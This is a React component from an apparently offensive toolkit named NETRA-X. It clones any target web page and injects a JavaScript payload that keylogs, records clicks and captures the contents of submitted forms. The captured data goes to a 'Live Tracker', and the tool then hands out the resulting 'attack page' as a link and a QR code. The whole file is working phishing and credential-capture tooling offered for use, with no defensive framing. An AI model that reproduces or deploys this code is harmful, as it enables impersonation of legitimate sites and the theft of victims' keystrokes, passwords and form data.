
'use client';

import { useState, useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import Link from 'next/link';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Wand, Share2, Clipboard, Globe, Settings } from 'lucide-react';
import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import { Label } from '@/components/ui/label';
import { QrCodeGenerator } from './qr-code-generator';
import type { JsPayload } from './javascript-library';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from './ui/accordion';

const formSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
  jsPayload: z.string().min(1, 'JavaScript Payload cannot be empty.'),
});

const defaultJsPayload = `
// NETRA-X Advanced Data Exfiltration Payload
(function() {
    // Use BroadcastChannel to send data to the 'Live Tracker' UI.
    const channel = new BroadcastChannel('netrax_c2_channel');
    
    // Assign a unique ID to this "victim" session
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        const payload = {
            sessionId: sessionId,
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
        };
        channel.postMessage(payload);
    }

    exfiltrate('connection', { message: 'Payload activated on page.' });

    // --- Keystrokes ---
    document.addEventListener('keydown', (e) => {
        exfiltrate('keystroke', { 
            key: e.key, 
            target: e.target.name || e.target.id || e.target.tagName 
        });
    }, true);

    // --- Clicks ---
    document.addEventListener('click', (e) => {
        exfiltrate('click', { 
            x: e.clientX, 
            y: e.clientY, 
            target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName
        });
    }, true);

    // --- Form Submissions ---
    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        exfiltrate('form-submit', { data });
        // We don't preventDefault here to allow the form to submit,
        // but in a real attack you might intercept and then redirect.
    }, true);
})();
`;

type AdvancedPageClonerProps = {
  selectedPayload: JsPayload | null;
}

export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps) {
  const { toast } = useToast();
  const { user } = useAuth();
  
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [hostedUrl, setHostedUrl] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isHosting, setIsHosting] = useState(false);
  const [dynamicParams, setDynamicParams] = useState<Record<string, string>>({});

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: 'https://google.com',
      jsPayload: defaultJsPayload.trim(),
    },
  });

  const parseAndSetDynamicParams = (code: string) => {
    const regex = /const\s+([a-zA-Z0-9_]+)\s*=\s*(['"`])(.*?)\2;/g;
    let match;
    const params: Record<string, string> = {};
    while ((match = regex.exec(code)) !== null) {
      params[match[1]] = match[3];
    }
    setDynamicParams(params);
  };
  
  useEffect(() => {
    if (selectedPayload) {
      form.setValue('jsPayload', selectedPayload.code);
      parseAndSetDynamicParams(selectedPayload.code);
      toast({ title: "Payload Loaded", description: `"${selectedPayload.name}" has been loaded into the payload field.`});
    }
  }, [selectedPayload, form, toast]);

  const handleParamChange = (key: string, value: string) => {
    setDynamicParams(prev => ({...prev, [key]: value}));
  };

  const getModifiedPayload = () => {
    let code = form.getValues('jsPayload');
    Object.entries(dynamicParams).forEach(([key, value]) => {
      const regex = new RegExp(`(const\\s+${key}\\s*=\\s*['"\`])(.*?)(['"\`];)`);
      code = code.replace(regex, `$1${value}$3`);
    });
    return code;
  };


  const processAndInject = async (values: z.infer<typeof formSchema>) => {
    setIsLoading(true);
    setModifiedHtml(null);
    setHostedUrl(null);

    try {
      toast({ title: 'Cloning Page...', description: 'Fetching DOM from the target URL.' });
      const response = await clonePageFromUrl({ url: values.targetUrl });
      let html = response.htmlContent;
      
      const payloadToInject = getModifiedPayload();
      const scriptToInject = `<script>${payloadToInject}</script>`;
      
      if (html.includes('</body>')) {
          html = html.replace(/<\/body>/i, `${scriptToInject}</body>`);
      } else {
          html += scriptToInject;
      }
      
      // Inject base tag to fix relative links
      if (html.includes('<head>')) {
        html = html.replace(/<head>/i, `<head>\\n<base href="${values.targetUrl}">`);
      } else {
        html = `<head><base href="${values.targetUrl}"></head>${html}`;
      }
      
      setModifiedHtml(html);
      toast({ title: 'Injection Complete', description: 'JavaScript payload has been injected.' });
    } catch (e) {
      const error = e instanceof Error ? e.message : 'An unknown error occurred';
      toast({ variant: 'destructive', title: 'Cloning Failed', description: error });
    } finally {
      setIsLoading(false);
    }
  };

  const handleGenerateLink = () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    setHostedUrl(null);

    try {
        const blob = new Blob([modifiedHtml], { type: 'text/html' });
        const finalUrl = URL.createObjectURL(blob);
        setHostedUrl(finalUrl);

        toast({ title: "Local Link Generated!", description: "Your attack page is ready." });

        logActivity({
            user: user?.displayName || 'Operator',
            action: 'Created Advanced Cloned Page',
            details: `Target: ${form.getValues('targetUrl')}`,
        });
    } catch(err) {
        const error = err instanceof Error ? err.message : "An unknown error occurred";
        toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
    } finally {
        setIsHosting(false);
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>Advanced Webpage Cloner (with JS Injection)</CardTitle>
        <CardDescription>Clone a page and inject a custom JavaScript payload to monitor real-time user interactions.</CardDescription>
      </CardHeader>
      <CardContent>
        <div className="grid md:grid-cols-2 gap-8">
            <Form {...form}>
            <form onSubmit={form.handleSubmit(processAndInject)} className="space-y-4">
                <FormField
                control={form.control}
                name="targetUrl"
                render={({ field }) => (
                    <FormItem>
                    <FormLabel>Target URL</FormLabel>
                    <FormControl>
                        <Input placeholder="https://example.com" {...field} />
                    </FormControl>
                    <FormMessage />
                    </FormItem>
                )}
                />
                <FormField
                control={form.control}
                name="jsPayload"
                render={({ field }) => (
                    <FormItem>
                    <FormLabel>JavaScript Payload to Inject</FormLabel>
                    <FormControl>
                        <Textarea placeholder="// Your custom JS code here..." {...field} className="font-mono h-48"/>
                    </FormControl>
                    <CardDescription>The output of this script will be sent to the Live Tracker.</CardDescription>
                    <FormMessage />
                    </FormItem>
                )}
                />

                {Object.keys(dynamicParams).length > 0 && (
                   <Accordion type="single" collapsible>
                        <AccordionItem value="item-1">
                            <AccordionTrigger><Settings className="mr-2 h-4 w-4"/>Customize Payload</AccordionTrigger>
                            <AccordionContent className="space-y-4 pt-4">
                                {Object.entries(dynamicParams).map(([key, value]) => (
                                    <div key={key} className="space-y-1">
                                        <Label htmlFor={`param-${key}`} className="font-mono text-xs">{key}</Label>
                                        <Input id={`param-${key}`} value={value} onChange={(e) => handleParamChange(key, e.target.value)} />
                                    </div>
                                ))}
                            </AccordionContent>
                        </AccordionItem>
                    </Accordion>
                )}


                <div className="flex flex-col sm:flex-row gap-2">
                    <Button type="submit" disabled={isLoading} className="w-full sm:w-auto">
                        {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
                        Clone & Inject JS
                    </Button>
                    <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full sm:w-auto">
                        {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
                        Generate Local Link
                    </Button>
                </div>
            </form>
            </Form>
             {hostedUrl ? (
                <div className="space-y-4">
                    <h3 className="font-semibold">Live Attack Page URL</h3>
                    <div className="w-full flex items-center gap-2">
                        <Input readOnly value={hostedUrl} className="font-mono" />
                        <Button type="button" size="icon" variant="outline" onClick={() => {
                            navigator.clipboard.writeText(hostedUrl);
                            toast({ title: 'Copied!'});
                        }}>
                            <Clipboard className="h-4 w-4" />
                        </Button>
                        <Button type="button" size="icon" variant="outline" asChild>
                            <a href={hostedUrl} target="_blank" rel="noopener noreferrer"><Globe className="h-4 w-4" /></a>
                        </Button>
                    </div>
                    <div className="flex justify-center pt-4">
                         <QrCodeGenerator url={hostedUrl} />
                    </div>
                </div>
            ) : (
                <div className="flex items-center justify-center h-full border rounded-lg bg-primary/10">
                    <p className="text-muted-foreground text-center p-4">Your generated attack URL and QR code will appear here.</p>
                </div>
            )}
        </div>
      </CardContent>
    </Card>
  );
}
